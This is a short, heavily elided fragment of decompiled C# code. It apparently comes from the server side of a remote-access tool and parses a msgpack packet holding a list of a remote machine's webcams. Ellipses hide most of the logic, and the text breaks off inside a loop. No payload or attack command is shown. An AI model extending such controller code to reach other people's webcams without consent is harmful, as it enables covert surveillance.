...
namespace Server.Handle_Packet
{
	...
	{
		// Token: 0x060002EC RID: 748 RVA: 0x00016E98 File Offset: 0x00016E98
			...
			else
			{
				...
				try
				{
					if (formWebcam != null)
					{
						...
						foreach (string text in unpack_msgpack.ForcePathObject("List").AsString.Split(new string[] { "-=>" }, StringSplitOptions.None))
						{
